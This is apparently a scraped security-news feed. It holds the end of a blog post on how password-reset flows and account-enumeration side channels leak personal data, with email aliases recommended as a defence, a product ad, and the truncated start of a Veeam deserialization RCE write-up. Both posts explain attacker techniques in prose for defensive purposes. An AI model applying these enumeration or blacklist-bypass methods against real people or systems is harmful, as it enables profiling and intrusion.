allow attackers to test whether a user account exists by comparing error messages or response times. For example, a login page might say “Invalid password” when a correct username is entered but “Username not found” when the username doesn’t exist. A “Forgot username” or registration form might outright say an email is already registered (confirming a user’s presence). These differences, however subtle, let an attacker enumerate valid accounts. Security professionals consider this a design flaw – <strong>best practice is to keep responses uniform</strong> so as not to give attackers an enumeration vector (<a href=\"https://raxis.com/blog/account-enumeration/#:~:text=acquired%20a%20list%20of%20valid,The%20same\" target=\"_blank\" rel=\"noopener\">Remediating Account Enumeration Vulnerabilities - Raxis</a>) (<a href=\"https://www.identityserver.com/articles/account-enumeration-how-to-harden-your-sso-solution#:~:text=An%20account%20enumeration%20attack%20involves,vague%20%E2%80%9CInvalid%20username%20or\" target=\"_blank\" rel=\"noopener\">Account Enumeration How To Harden Your SSO Solution</a>). Yet, in the wild, many sites still have this weakness. To an OSINT agent, a list of emails and a site with such responses is all that’s needed to start mapping out who has an account there.</li><li><strong>Timing and CAPTCHA Bypasses</strong>: Even when sites try to be coy (for instance, always saying “If an account exists, we’ve sent an email”), attackers might use timing differences (how long the request takes, or subtle differences in behavior) to infer a true/false behind the scenes. In some cases, sites implement CAPTCHAs or rate limiting on password reset to deter mass querying – but dedicated attackers can distribute queries over time or use bot networks to avoid detection. These aren’t so much leaks as they are , yet they qualify as side-channel when the service doesn’t explicitly confirm anything, but patterns still emerge that betray information. For example, an API might take a few milliseconds longer to return the “non-existent” response than the “email sent” response, effectively leaking the truth to those measuring carefully.</li><li><strong>Abusing Linked Accounts and Contacts</strong>: Some platforms allow users to find friends by contacts or link accounts. A crafty actor might, for instance, take a list of phone numbers or emails and upload it to a service’s “find friends” feature. If the service (e.g., a messaging app or social network) then tells which of those contacts are registered users, voila – you’ve enumerated who is on the platform. There have been cases where dating apps or messaging services accidentally allowed querying in this way, essentially acting as an oracle of user existence. While many companies have tightened these features (often requiring the querying account to have a verified profile or limiting lookups), they remain a potential avenue for information leakage if not properly secured.</li><li><strong>Cross-Service Data Combos</strong>: We touched on the Mat Honan example – that was a chain of Amazon and Apple giving out different pieces of info. In the OSINT realm, similar chaining can occur entirely through open sources. For example, a password reset on Facebook might give an obfuscated email that hints at a Gmail address; an attacker can then go to Gmail’s account recovery and input variations of that email until one of them  return “No such account” – now they’ve confirmed the exact email. Next, that Gmail address might be run through HaveIBeenPwned (a breach-checking service) to see if it appears in any known data breaches, possibly revealing if it was used on other hacked services and what username was linked to it. Each step is a side-channel that provides a piece, and the attacker assembles the puzzle. None of this requires logging in to any account – it’s all based on how services respond to outsiders.</li></ul><p>One illustrative case involved a researcher compiling someone’s data just by resets and search: after getting partial info from a Facebook reset (which revealed a profile name and a bit of an email), they guessed the person’s Gmail address by matching the pattern and confirmed it via Google’s reset page. With the confirmed Gmail in hand, they then likely leveraged Google search and other public databases to find the person’s phone number (since they already knew it ended in certain digits from the Facebook hint) (<a href=\"https://exploits.run/password-osint/#:~:text=Image\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>) (<a href=\"https://exploits.run/password-osint/#:~:text=found,and%20validated%20her%20Gmail%20address\" target=\"_blank\" rel=\"noopener\">Using Password Resets for OSINT</a>). It’s a cascading waterfall of tiny leaks, each one opening the door a little further.</p><p>The key takeaway is that <em>information wants to be free</em> – even systems that are not supposed to give any user data to unauthenticated queries often do so indirectly. OSINT actors are adept at noticing these side doors. A seemingly innocuous feature or error message can become an intelligence coup when exploited cleverly.</p><h2><a href=\"https://sagi.io/the-national-security-case-for-email-plus-addressing/#why-this-is-a-national-security-issue\" aria-label=\"why this is a national security issue permalink\"></a>Why This is a National Security Issue</h2><p>Up to now, we’ve discussed how individual user accounts can be discovered and profiled by adversaries. It’s clearly a personal privacy issue – but how does this escalate to the level of national security? The answer lies in scale and intent. When those conducting the reconnaissance are not just curious hackers, but <strong>nation-state intelligence agencies or well-funded cybercriminal groups</strong>, the stakes are much higher. These actors aren’t looking at one person or one account in isolation; they are building massive maps of who’s who in the digital world, seeking strategic advantages.</p><p>Consider a foreign adversary aiming to target government and military personnel. One way to do that is by phishing or social engineering – but phishing is far more effective when you know your target’s digital habits. If an attacker knows that a certain official has an account on a specific cryptocurrency exchange (say Binance) and that the account’s recovery phone ends in 4321, they could craft a very convincing spear-phishing email or SMS pretending to be from Binance, referencing those last four digits (“Your account ending in 4321…”). Such a message immediately looks more legit because it matches the victim’s real experience. <strong>Adversaries can use OSINT-gathered data (like phone fragments or account existence) to add credibility to phishing attempts</strong> and tailor the lure to something the target actually uses. This dramatically increases the success rate of compromises.</p><p>Another national security dimension is <strong>identity theft and impersonation at scale</strong>. If cybercriminal syndicates (which sometimes collaborate with or are tolerated by hostile governments) harvest these account details, they could conduct wide-reaching fraud or infiltration. For example, knowing that a senior engineer at a defense company uses the same email for a hobby drone forum gives an attacker a path to impersonate a fellow hobbyist and strike up a conversation that leads to trust – classic social engineering. Or consider how partial data like phone numbers and credit card suffixes can be used: an attacker armed with the last 4 digits of a target’s card (gleaned from a breached site or a careless reset form) plus knowledge of their email and maybe home address (from public records) could call a bank pretending to be the target. Those little data points are often used by customer support as verification. In essence, <strong>partial PII leaks are the jigsaw pieces for full-on identity theft</strong> or impersonation.</p><p>From a pure intelligence standpoint, the aggregation of such data is a goldmine. We know that certain nation-states have invested heavily in compiling personal data on Americans and others. The 2015 OPM (Office of Personnel Management) breach, attributed to China, exposed sensitive personal information (including detailed background checks) of <strong>over 21 million U.S. government employees and contractors</strong> (<a href=\"https://www.rand.org/pubs/commentary/2016/02/opm-hack-poses-overlooked-counterintelligence-risk.html#:~:text=OPM%27s%20database%20is%20a%20treasure,communications%20designed%20to%20elicit%20information\" target=\"_blank\" rel=\"noopener\">OPM Hack Poses Overlooked Counterintelligence Risk for Economic Espionage | RAND</a>). Analysts noted that a trove like that could be used to identify individuals’ vulnerabilities – financial troubles, contacts, etc. – to potentially blackmail or recruit them (<a href=\"https://www.rand.org/pubs/commentary/2016/02/opm-hack-poses-overlooked-counterintelligence-risk.html#:~:text=OPM%27s%20database%20is%20a%20treasure,communications%20designed%20to%20elicit%20information\" target=\"_blank\" rel=\"noopener\">OPM Hack Poses Overlooked Counterintelligence Risk for Economic Espionage | RAND</a>). While the OPM hack was a direct breach, imagine augmenting that data with OSINT-collected details: personal email addresses of each person, what online services they use, which social networks or dating sites they’re on (valuable for leverage or approaches), and fragments of phone or backup info. It paints a comprehensive picture of each target’s digital footprint. For an intelligence service, this is . It means they don’t have to start from scratch when targeting someone – they already know which angle might work best, which accounts to try compromising first, or what kind of lure might bait the person.</p><p>Even outside of government targets, consider . A rival nation’s spies might gather account-reset data on employees of a defense contractor or a critical infrastructure company. If they see that many engineers use a certain file-sharing service or personal Gmail, those become prime targets for phishing that could ultimately lead to corporate network breaches. Or, by seeing which vendors or banks those employees use (via account enumeration), they could impersonate those businesses in fraudulent communications (this method has been used in many “supplier payment fraud” scams). The possibilities go on – all rooted in that initial scraping of publicly accessible account information.</p><p>In summary, the <strong>danger is in the aggregation and application</strong> of this data. What might seem like harmless slivers of info (a phone ending in 67 here, an email that shows up on a fitness app there) can be aggregated into robust dossiers. When assembled by adversaries with strategic goals – whether espionage, influence, or large-scale fraud – these dossiers become powerful weapons. The U.S. Cyberspace Solarium Commission and other policy groups have warned that personal data exposure is a national security risk, not just a privacy one. The case of password reset OSINT is a perfect example: it’s an exploit that can operate quietly at massive scale, potentially profiling millions. <strong>Defending against it isn’t just about individual hygiene; it requires systemic changes and awareness at the highest levels.</strong></p><p>Faced with this rather sobering landscape, what can be done? The good news is that there  strategies – both for individuals and for organizations – to mitigate these risks. Some solutions are as simple as changing how we use our email addresses, while others involve changes to web services and policies. Mitigation falls into two broad categories: <strong>empowering users to be less trackable</strong> and <strong>making systems leak less information</strong>. Let’s explore a few key strategies:</p><h3><a href=\"https://sagi.io/the-national-security-case-for-email-plus-addressing/#email-plus-addressing--unique-identifiers-per-service\" aria-label=\"email plus addressing  unique identifiers per service permalink\"></a>Email “Plus Addressing” – Unique Identifiers per Service</h3><p>One of the simplest yet most effective steps individuals can take is to use <strong>email aliases or “plus addresses”</strong> when registering for services. Most email providers (like Gmail, Outlook, etc.) allow you to add a “+tag” to your email address. For example, if John Doe’s email is , he can sign up for Twitter as , and for Amazon as . Emails will still reach his main inbox (Gmail ignores anything after the “+”), but now each account of his has a slightly different username. This means that if an OSINT tool or attacker only knows  and tries that on a site where John used , it <strong>won’t register as the same address</strong>. Essentially, plus addressing allows you to create unlimited unique identifiers that all funnel to you, without needing separate accounts.</p><p>However, there are some caveats and challenges with plus addressing. First, not all websites allow “+” in email addresses (some outdated or poorly coded systems reject them thinking they’re invalid). This is getting better as plus-addressing becomes more common, but it still happens occasionally. Second, if you ever need to verbally tell someone your email for support, a plus address can confuse agents (“john.doe plus sign something?”). And third, some attackers may try to strip or ignore the plus part if they see it. In fact, some threat actors, when they obtain breached email lists, will <strong>remove any “+alias” portions</strong>, assuming it might be a trap or an indicator of a security-conscious user (<a href=\"https://krebsonsecurity.com/2022/08/the-security-pros-and-cons-of-using-email-aliases/#:~:text=Alex%20Holden%2C%20founder%20of%20the,spam%20to%20their%20aliased%20addresses\" target=\"_blank\" rel=\"noopener\">The Security Pros and Cons of Using Email Aliases – Krebs on Security</a>) (<a href=\"https://krebsonsecurity.com/2022/08/the-security-pros-and-cons-of-using-email-aliases/#:~:text=%E2%80%9CI%20can%20tell%20you%20that,%E2%80%9D\" target=\"_blank\" rel=\"noopener\">The Security Pros and Cons of Using Email Aliases – Krebs on Security</a>). Alex Holden of Hold Security noted that in underground markets, hacked data is often sanitized to drop the “+tag” so that only the base email remains (<a href=\"https://krebsonsecurity.com/2022/08/the-security-pros-and-cons-of-using-email-aliases/#:~:text=Holden%20said%20freshly,portion%20of%20the%20email%20address\" target=\"_blank\" rel=\"noopener\">The Security Pros and Cons of Using Email Aliases – Krebs on Security</a>). This means if a breach of “<a href=\"https://sagi.io/cdn-cgi/l/email-protection\" data-cfemail=\"dabfa2bbb7aab6bff1b8bbb4b19abdb7bbb3b6f4b9b5b7\">[email&nbsp;protected]</a>” occurs, the hacker might sell it as just “<a href=\"https://sagi.io/cdn-cgi/l/email-protection\" data-cfemail=\"c9acb1a8a4b9a5ac89aea4a8a0a5e7aaa6a4\">[email&nbsp;protected]</a>” to appear more generic. While that defeats the purpose of identifying the source of spam, the good news is the attacker still has only your base email – they won’t automatically know the plus addresses you used elsewhere.</p><p>Despite these minor drawbacks, <strong>sub-addressing (plus aliases)</strong> is highly recommended by many security experts for improving privacy and security (<a href=\"https://krebsonsecurity.com/2022/08/the-security-pros-and-cons-of-using-email-aliases/#:~:text=One%20way%20to%20tame%20your,unique%20alias%20for%20each%20website\" target=\"_blank\" rel=\"noopener\">The Security Pros and Cons of Using Email Aliases – Krebs on Security</a>). It’s a low-effort, no-cost tactic. Policymakers and IT departments could encourage the use of aliases especially for officials or employees who need to interact with external websites. For example, a government agency could train staff to use  for work-related third-party services, and  for personal sites. If nothing else, it creates <strong>speed bumps for OSINT correlation</strong> – and sometimes a speed bump is all you need to deter broad sweeps. An attacker might move on to easier targets who use a single email everywhere.</p><h3><a href=\"https://sagi.io/the-national-security-case-for-email-plus-addressing/#masked-email-services-and-trusted-forwarders\" aria-label=\"masked email services and trusted forwarders permalink\"></a>Masked Email Services and Trusted Forwarders</h3><p>Plus addressing still relies on one root email that’s discoverable (everything before the “+” is constant). For those wanting to take identity separation to the next level,  offer a more robust solution. A masked email service (or alias email service) gives you the ability to generate entirely different email addresses (often with different domains) that forward to your real email. Unlike the built-in “+” trick, these aliases don’t contain your real address at all – so a human or even an automated system can’t immediately tell that two different aliases belong to the same person.</p><p>Examples of such services include SimpleLogin, AnonAddy, Firefox Relay, and Apple’s Hide My Email (as discussed). For instance, SimpleLogin might let Jane Doe create  which forwards to her real Gmail. She could also create  for her airline accounts. To any OSINT observer, those look like two unrelated emails on different domains. If one gets leaked, it cannot be connected to the other unless the attacker somehow breaches the alias service itself (which is designed not to reveal mappings). Apple’s system, which uses the privaterelay.appleid.com domain, is a specific case where Apple manages the forwarding in a tightly controlled way (<a href=\"https://support.apple.com/en-us/105078#:~:text=Hide%20My%20Email%20generates%20unique%2C,email%20address%20is%20kept%20private\" target=\"_blank\" rel=\"noopener\">How to use Hide My Email with Sign in with Apple - Apple Support</a>).</p><p>A forwarder service adds an extra layer of indirection – essentially acting as a shield. The security of this approach, of course, hinges on the trustworthiness of the forwarding service. If the alias provider were malicious or got hacked, they could expose the link between your aliases and your real identity. This is where the idea of running such a service in a <strong>Trusted Execution Environment (TEE)</strong> comes in. Imagine a company (or government IT department) operating an alias email server that runs inside a hardware-enforced secure enclave. The server knows the mapping of aliases to real emails in memory, but even the server admins or a hacker breaking into the OS can’t easily extract that data, thanks to the TEE protections. All emails are encrypted and processed in that secure enclave, then forwarded out. This would minimize the risk of the alias service itself becoming a point of failure or surveillance.</p><p>While that might sound very high-tech, it’s an extension of existing ideas. Apple essentially promises a similar concept (they claim they don’t store or read the content of Hide My Email messages, and they delete relay emails shortly after forwarding (<a href=\"https://support.apple.com/en-us/105078#:~:text=this%20option%20in%20Sign%20in,set%20on%20your%20Apple%20Account\" target=\"_blank\" rel=\"noopener\">How to use Hide My Email with Sign in with Apple - Apple Support</a>)). A TEE-based approach would just add extra cryptographic assurance to that promise. For corporate or government use, one could envision an internal service where every employee gets an @mask.myagency.gov alias domain, and for any external site they register, they generate a unique address. That alias forwards to their real inbox, but externally it’s hard to tie aliases together. If this system is properly secured (via TEE or strict policies), even if an attacker compromised the alias domain or one of the addresses, they couldn’t enumerate others or find the real user easily.</p><p>In practical terms, even consumers today can use non-TEE but reliable services: for example,  (by Mozilla) provides a browser extension to create random aliases on the fly, and <strong>DuckDuckGo’s Email Protection</strong> does similarly, blocking trackers in the emails it forwards. These masked emails fulfill a similar role as plus-addresses but with the benefit that they’re completely different strings. So, if earlier an attacker could strip “+amazon” and try just the base, here there is no base to try –  might use an alias  for one site and  for another, with no obvious relation.</p><p>The bottom line: <strong>Unique emails per service</strong> – whether via plus addressing or full-fledged masking – is one of the strongest defenses against the kind of OSINT enumeration we discussed. It turns the attacker’s one-to-many mapping (one email -&gt; many accounts) into a one-to-one mapping (one alias per account). Even if they compromise or figure out one account, they hit a dead end; it doesn’t reveal what other accounts the person has. For high-value targets, this could thwart broad profiling. It’s like each of your online personas wears a different disguise. It might be a little more effort to manage, but for those in sensitive positions, it can be well worth it.</p><p>Ultimately, the burden shouldn’t fall entirely on users to hack around these problems. Web services and platform providers should recognize the <strong>privacy and security pitfalls</strong> of their current password recovery and authentication designs. Here are some recommendations – both policy-level and technical – that could make a big difference if widely adopted:</p><ul><li><strong>Stop Leaking Data in Password Reset Flow</strong>: The most direct fix is for websites to <em>standardize their password reset responses</em>. Ideally, no personally identifiable information (even partial) should be exposed to someone who is not fully authenticated. As Martin Vigo urged, <em>“Ideally we don’t leak anything to unauthorized users, such as those who simply know your email address.”</em> (<a href=\"https://portswigger.net/daily-swig/new-osint-technique-exploits-password-reset-process-to-obtain-users-phone-numbers#:~:text=%E2%80%9CIdeally%20we%20don%E2%80%99t%20leak%20anything,%E2%80%9D\" target=\"_blank\" rel=\"noopener\">New OSINT technique exploits password reset process to obtain users’ phone numbers | The Daily Swig</a>). Instead of showing “Phone number ending in 4321”, a site could simply say “We’ve sent a verification code to your registered contact.” If the user forgot which contact that is, they’ll find out when that device or email gets the code. Some might argue this harms user experience, but it’s a trade-off for security. At minimum, companies should agree on <strong>best practices for masking</strong>: for instance, always show only the last 2 digits of a phone (no more first digits), or allow users to customize a hint phrase. Vigo even proposed using  for recovery options (<a href=\"https://portswigger.net/daily-swig/new-osint-technique-exploits-password-reset-process-to-obtain-users-phone-numbers#:~:text=One%20proposal%20brought%20forward%20by,digits%20from%20the%20telephone%20number\" target=\"_blank\" rel=\"noopener\">New OSINT technique exploits password reset process to obtain users’ phone numbers | The Daily Swig</a>). For example, I could label my phone “Work cell” and the reset page would just say “Code sent to your Work cell.” This gives me a hint but reveals nothing useful to an outsider. Such ideas should be further explored by the industry.</li><li><strong>Uniform Responses for Account Existence</strong>: To combat enumeration attacks, login and account recovery endpoints should give <strong>identical replies or behaviors</strong> whether or not an account exists (<a href=\"https://raxis.com/blog/account-enumeration/#:~:text=acquired%20a%20list%20of%20valid,The%20same\" target=\"_blank\" rel=\"noopener\">Remediating Account Enumeration Vulnerabilities - Raxis</a>). For instance, when entering an email on a reset form, always show a generic message like “If an account with that email exists, a reset link will be sent.” Do not indicate “email not found” in a distinct way. Many big providers (like Microsoft, Google) adopted this language years ago, but inconsistencies remain across the web. Regulators or industry groups could push for this as a basic security standard, since it’s a well-known issue (OWASP lists user enumeration as a common vulnerability). Similarly, APIs should refrain from distinct error codes for “no such user”. By eliminating those telltale signs, we make automated mass-scan OSINT much harder. An attacker then cannot easily confirm if an email is registered without actually having access to that email’s inbox or phone (to receive a code).</li><li><strong>Rate Limiting and Monitoring</strong>: Web services should implement rate limiting on account lookups and password reset attempts. If one IP (or a small range) is hitting the password reset page for thousands of different usernames or emails, that’s a red flag of enumeration. Throttling those requests or presenting CAPTCHAs after a few tries can slow down OSINT scrapers significantly. Companies could also monitor and flag unusual patterns – e.g., an attempt to cycle through many phone number combinations on the reset page – and share such intel within the security community.</li><li><strong>Encouraging 2FA and Unique Identifiers</strong>: Another mitigation for the phone-number-leaking issue is encouraging the use of authenticator apps or security keys for two-factor authentication (2FA) rather than SMS. If SMS isn’t used, the reset flow might not even have a phone number on file to leak. Likewise, services could allow users to opt-out of SMS resets or choose an alternative verification method that doesn’t involve showing digits (for instance, backup codes or email-only recovery). For financial info like credit cards, companies should never use credit card numbers alone as identity verification (the Mat Honan case showed why). Policy could mandate that partial financial info not be reused across services for auth – or that if one service exposes a piece (like last 4 digits), another service cannot accept just that piece as proof. This is more in the realm of  or even regulation (to avoid insecure cross-service trust).</li><li><strong>Promote Adoption of Alias and Forwarding Solutions</strong>: Platforms that handle identity (especially email providers and SSO providers) should consider building in alias management for users. Microsoft, Google, and others could follow Apple’s lead and integrate an option to “use an alias email for this site.” Even if it’s not as seamless as Apple’s, providing a simple UI to manage plus-addresses or alternate addresses would go a long way. From a policy perspective, making sure plus-addressing is supported (as some legislation of digital services might require compatibility with standard email formats) would help. Companies should not treat “<a href=\"https://sagi.io/cdn-cgi/l/email-protection\" data-cfemail=\"fe9b939f9792d59f92979f8dbe9a91939f9790d09d9193\">[email&nbsp;protected]</a>” as invalid input – perhaps a compliance test could be introduced for major services to ensure they accept sub-addressing, thus encouraging users to actually use this feature.</li><li><strong>Education and Policy for High-Risk Individuals</strong>: For those in sensitive roles (government, defense, critical infrastructure), internal policies could mandate or strongly encourage using unique emails for external accounts. Government agencies might even issue their staff a set of pre-made alias addresses for common services or training on how to set them up. The idea is to treat personal digital footprint as an extension of security training. If an official knows that using the same email for their work and personal life could endanger them or their colleagues, they may take steps to segregate identities. At the national policy level, awareness campaigns about OSINT risks (similar to how there are warnings about social media oversharing) could include this less obvious angle of account enumeration.</li></ul><p>In essence, <strong>web services need to reduce the information spillage</strong>, and <strong>users need better tools to diversify their online identities</strong>. Both halves are required to address the issue. If we can make it standard that password reset pages are tight-lipped and that using a unique email per site is easy, the whole OSINT password-reset gambit could be largely defanged. This might even push OSINT collectors toward more difficult avenues, raising the cost and effort for our adversaries to conduct large-scale reconnaissance.</p><p>The humble email address was never meant to be a national security linchpin, yet in our interconnected world it has become exactly that. When a single identifier ties together a person’s banking, social media, work logins, and more, the stakes of that identifier being discoverable are enormous. We’ve seen how <strong>specialized OSINT companies and threat actors exploit password recovery mechanisms</strong> to unmask these linkages, correlating accounts and scraping partial personal data in the process. What might seem like trivial details – a couple digits of a phone number, an obfuscated email prefix – can, in the aggregate, enable <strong>precision attacks and surveillance</strong>. This is a classic example of how  (like helpful password hints or one-click logins) can backfire when abused, tipping the balance in favor of attackers.</p><p>From a national security perspective, the ability for adversaries to quietly compile dossiers on officials or citizens is deeply concerning. We worry (rightly) about stolen databases and hacked secrets, but we should equally worry about the <strong>“ossified” data that leaks by design</strong> through everyday web features. The case for <strong>Email Plus Addressing and other alias techniques</strong> is not just about stopping spam or organizing your inbox – it’s about throwing a wrench into an adversary’s OSINT machinery. By embracing unique email per service and advocating for privacy-preserving login mechanisms, we make it exponentially harder for malicious actors to capitalize on the current ecosystem’s transparency.</p><p>Policymakers can play a role by pushing for standards that limit information disclosure in authentication flows and perhaps by incentivizing the development of secure identity management tools (like that masked email in a TEE idea). Cybersecurity professionals, on the other hand, can lead by example – employing these techniques themselves and educating users about them. After all, our community often preaches about password managers and 2FA; maybe it’s time we add <strong>“unique email addresses for important accounts”</strong> to the list of best practices we disseminate.</p><p>In the cat-and-mouse game of cybersecurity, there is no permanent solution – but we’ve learned that raising the bar even a little can deter a large chunk of attacks. Email aliases and better recovery flows are not terribly hard to implement, yet they could foil automated OSINT reconnaissance and blunt the effectiveness of phishing campaigns that rely on that intel. It’s a rare win-win: improving user privacy  national security posture in one go.</p><p>The national security case for email plus addressing ultimately boils down to this: . Just as we avoid single points of failure in infrastructure, we should avoid single points of exposure in our digital identities. By fragmenting the trail we leave online, we deny attackers the easy, cheap intel they’ve been feasting on. It’s time to close these side-channel leaks and take back some privacy – one “+alias” at a time, if need be. The security of not just individuals, but potentially a nation, might depend on it.</p><p>Comments and thoughts are also welcome on this tweet:</p>","contentLength":39617,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jfqp8d/the_national_security_case_for_email_plus/"},{"title":"Orphaned DNS Records & Dangling IPs Still a problem in 2025","url":"https://guardyourdomain.com/blog/dns-danger-zone/","date":1742477232,"author":"/u/Seaerkin2","guid":6151,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jfovru/orphaned_dns_records_dangling_ips_still_a_problem/"},{"title":"Shield Your Devices, Secure Your Business: Master Windows Endpoint Security","url":"https://scalefusion.com/lp/windows-endpoint-security/?utm_campaign=Scalefusion%20Promotion&amp;utm_source=Reddit&amp;utm_medium=social&amp;utm_term=RS","date":1742477140,"author":"/u/Signal_Car_5756","guid":6150,"unread":true,"content":"<div><p>Simplify Windows device management</p><p>Configure, monitor, and automate policies from one dashboard.</p></div><div><p>Frictionless app updates and installations</p><p>Scan, sync, schedule and push app updates and patches from a unified console. Ensure stability that adapts to your business needs.</p></div><div><p>Sign in once, access everything</p><p>Activate one-click login with device-trust-based SSO. Enforce strong access permissions for trusted devices and secure browsers.</p></div><div><p>Device enrollment made simple</p><p>Enroll like a breeze and get your Windows PCs business ready in minutes. Eliminate enrollment chaos.</p></div><div><p>Enhance security with multi-factor authentication(MFA) to safeguard sensitive data. Get an additional layer of protection with UEM Integration.</p></div><div><p>Secure thousands of endpoints effortlessly, whether in-office or remote.</p></div>","contentLength":770,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jfoumx/shield_your_devices_secure_your_business_master/"},{"title":"By Executive Order, We Are Banning Blacklists - Domain-Level RCE in Veeam Backup & Replication (CVE-2025-23120) - watchTowr Labs","url":"https://labs.watchtowr.com/by-executive-order-we-are-banning-blacklists-domain-level-rce-in-veeam-backup-replication-cve-2025-23120/","date":1742439252,"author":"/u/dx7r__","guid":6045,"unread":true,"content":"<p>Once again, we hear the collective groans - but we're back and with yet another merciless pwnage of an inspired and clearly comprehensive RCE solution - no, wait, it's another vuln in yet another backup and replication solution..</p><p>While we would enjoy a world in which we could be a little merciful - today we'll explore the painful world of blacklist-based security mechanisms. You can treat this post as a natural continuation of our <a href=\"https://labs.watchtowr.com/veeam-backup-response-rce-with-auth-but-mostly-without-auth-cve-2024-40711-2/\" rel=\"noopener noreferrer\">CVE-2024-40711 writeup</a>, which was written by fellow watchTowr Labs team member <a href=\"https://x.com/SinSinology?ref=labs.watchtowr.com\" rel=\"noopener noreferrer\">Sina Kheirkhah (@SinSinology)</a>.</p><p>Our previous watchTowr Labs post provided a detailed walk-through of a Remote Code Execution vulnerability RCE issue in Veeam Backup &amp; Replication, achievable from an unauthenticated perspective. This vulnerability was discovered and responsibly disclosed by one of our favourite researchers from 'across the aisle' - <a href=\"https://twitter.com/frycos?ref=labs.watchtowr.com\">Florian Hauser (@Frycos)</a> with&nbsp;<a href=\"https://code-white.com/?ref=labs.watchtowr.com\">Code White Gmbh</a> - and the RCE itself was interesting with twists included.</p><p>As an industry, we know that uncontrolled deserialization always leads to bad things. This is why one should always implement strict control of classes that are being deserialized. Ideally, it should be a whitelist, which allows the deserialization of selected classes only. Although technically, the Veeam solution in discussion does this, one of the allowed classes… leads to inner deserialization, which subsequently implements a blacklist-based check.</p><p>You can deserialize anything - except the ones that Veeam has decided are bad.</p><p>Blacklists (also known as block-lists or deny-lists) are based on a very optimistic (and provably flawed) idea that we can just make a list of all the bad classes, and we just keep a record of everything bad that can be done and update our list as and when new bad is introduced. </p><p>Luckily, as an industry, we actually already have a list of all the bad classes in the world, and so this is flawless logic. There are a couple of bitter truths though:</p><ul><li>This is a lie. While we can agree that nowadays it’s extremely hard to find new deserialization gadgets in programming languages and frameworks (although still possible), products have their own codebase and can contain abusable classes that can be misused during deserialization. This is before we even get on to 3rd party libraries.</li></ul><blockquote>Author’s note: There are many technical posts and papers about abusing the deserialization blacklists. I can shamelessly point you to my <a href=\"https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf?ref=labs.watchtowr.com\" rel=\"noopener noreferrer\">whitepaper</a> and <a href=\"https://www.youtube.com/watch?v=_CJmUh0_uOM&amp;ref=labs.watchtowr.com\" rel=\"noopener noreferrer\">Hexacon talk</a>, where I’ve been pwning blacklists through new deserialization gadgets discovered in .NET Framework, targeted product codebase and 3rd party libraries. <p>James Kettle said that this research “destroys any faith you might have had in blocklist-based deserialization mitigations”. While I personally love this quote and I couldn’t have described my research goal better, it seems that I’ve ultimately failed. Vendors are still using blacklists a lot, and I don’t believe it’s going to change very soon.</p></blockquote><ul><li>The list of deserialization gadgets is actually pretty big - especially for Java and C#. We have routinely shown, privately and publicly, that we can abuse blacklist-protected deserialization sinks with commonly known gadget. </li></ul><p>Anyway, you've probably guessed where this is going today - it seems Veeam, despite being a ransomware gang's favourite play toy - didn’t learn after the lesson given by <a href=\"https://x.com/frycos?ref=labs.watchtowr.com\">Frycos</a> in previous research published. You guessed it - they fixed the deserialization issues by adding entries to their deserialization blacklist.</p><p>We're bored, we're restless - so, we decided to have a quick look at the current state of their list to see if we could find a way to add our mark.</p><p>In this blog post, we will show you 2 Remote Code Execution vulnerabilities in the Veeam Backup &amp; Response solution, which are based on very similar deserialization gadgets existing in the Veeam codebase. </p><p>These vulnerabilities can be exploited by any user who belongs to the local users group on the Windows host of your Veeam server.<strong> Better yet - if you have joined your server to the domain, these vulnerabilities can be exploited by any domain user.</strong></p><p>I know that you, dear reader, do not join your Veeam Backup &amp; Replication backup server to your Active Directory domain. That's because you don't use Veeam Backup &amp; Replication - <strong>many people (not all) do exactly this.</strong></p><p>And yes, we know. We typically don’t write about post-auth vulnerabilities. We decided to make an exception, though, because we are talking about a critical piece of software where, bluntly - the authentication requirement is fairly weak. </p><p>Imagine that any employee of your 50 000 people organization can get SYSTEM on your backup server. Kind of scary, right? Especially when you think about those threat actors that seemingly and magically appear to get shellz on your endpoints.</p><blockquote>Author’s note: This research would never happen if not for my colleague <a href=\"https://x.com/SinSinology?ref=labs.watchtowr.com\">Sina</a>. He insisted that I should have a look at the Veeam deserialization mechanism, and I would have never done this if not him. He has also provided me all the knowledge needed for the exploitation, thus I only needed to focus on an easy stuff - gadget discovery.</blockquote><p>CVE-2024-40711 is fully detailed in <a href=\"https://labs.watchtowr.com/veeam-backup-response-rce-with-auth-but-mostly-without-auth-cve-2024-40711-2/\">our previous blog post</a>. However, we will provide you with a very brief recap here.</p><p>Veeam Backup &amp; Replication exposes the .NET Remoting Channel, which as you may know allows you to reach some internal deserialization capabilities based on  . </p><p>Veeam introduced a custom formatter, which protects against an unsafe deserialization through a whitelist-like mechanism. This is good! Issues appear when the whitelist is too broad though.</p><p>Of note though, was the <code>Veeam.Backup.Model.CDbCryptoKeyInfo</code> class - one of the classes Veeam allows for deserialization.</p><p>This class is  and its magic constructor can be reached through the .NET Remoting deserialization:</p><pre><code>namespace Veeam.Backup.Model\n{\n\t[Serializable]\n\tpublic class CDbCryptoKeyInfo : ISerializable, IConcurentTracking, IEquatable&lt;CDbCryptoKeyInfo&gt;, ILoggable, IMetaRecoveryKeyInfo, IMetaCryptoKey, IMetaEntity, IMetaElement, IMetaVisitable\n\t{\n\t\tprotected CDbCryptoKeyInfo(SerializationInfo info, StreamingContext context)\n\t\t{\n\t\t\tCProxyBinaryFormatter cproxyBinaryFormatter = CProxyBinaryFormatter.CreateWithRestrictedBinder();\n\t\t\tthis.Id = (Guid)info.GetValue(\"Id\", typeof(Guid));\n\t\t\tbyte[] value = (byte[])info.GetValue(\"KeySetId\", typeof(byte[]));\n\t\t\tthis.KeySetId = new CKeySetId(value);\n\t\t\tthis.KeyType = (EDbCryptoKeyType)((int)info.GetValue(\"KeyType\", typeof(int)));\n\t\t\tthis.EncryptedKeyValue = Convert.FromBase64String(info.GetString(\"DecryptedKeyValue\"));\n\t\t\tthis.Hint = info.GetString(\"Hint\");\n\t\t\tthis.ModificationDateUtc = info.GetDateTime(\"ModificationDateUtc\").SpecifyDateTimeUtc();\n\t\t\tthis.CryptoAlg = (ECryptoAlg)info.GetInt32(\"CryptoAlg\");\n\t\t\tthis._repairRecs = 